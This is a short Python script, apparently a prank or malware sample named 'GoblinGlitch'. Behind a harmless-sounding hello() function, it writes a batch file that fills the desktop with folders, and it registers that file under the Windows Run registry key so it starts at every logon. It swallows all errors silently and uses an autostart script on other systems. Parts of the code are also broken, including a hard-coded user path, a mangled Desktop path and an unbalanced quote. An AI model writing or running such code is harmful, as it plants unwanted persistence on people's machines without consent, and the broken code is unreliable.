import os
import winreg as reg

global home
global desktop

home = os.path.expanduser('~')
desktop = os.path.expanduser('~Desktop')
def hello():
    try:
        with open(f'{home}\\goblinglitch.bat', 'w') as f:
            f.write("@echo off")
            f.write('\nSET counter=1\n')
            f.write(f"SET folderPath={desktop}")
            f.write('\nIF NOT EXIST "%folderPath%" MKDIR "%folderPath%"')
            f.write('\n:while')
            f.write('\nIF %counter% LEQ 4 (')
            f.write('\n    MKDIR "%folderPath%\GoblinGlitch%counter%"')
            f.write('\n    SET /A counter+=1')
            f.write('\n    GOTO while')
            f.write('\n)')
            f.close()
    except PermissionError:
        pass
    except IOError:
        pass
    except Exception:
        pass

    # Path to the .bat file
    bat_file_path = r"C:\Users\omind\goblinglitch.bat"

    # Command that will run the .bat file (we can just specify the path to the .bat file)
    command = f'"{bat_file_path}"'

    # Registry key where startup items are stored
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "GoblinGlitch"  # The name of the registry entry

    try:
        # Open the registry key for editing (create it if it doesn't exist)
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE)
        
        # Add a new entry to the registry
        reg.SetValueEx(registry_key, value_name, 0, reg.REG_SZ, command)
        
        # Close the registry key
        reg.CloseKey(registry_key)
    except Exception as e:
        pass


if os.name == 'nt':  # Windows
        hello()
else:  
        home = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        with open(f'{home}\\goblinglitch.sh', 'w') as f:
            f.write("count=1")
            f.write('\nwhile [ $count -le 5 ]; do')
            f.write(f"\ntpath={desktop}")
            f.write('\n     mkdir "$tpath/GoblinGlitch$count')
            f.write('\n     count=$((count + 1))')
            f.write('\ndone')
            f.close()

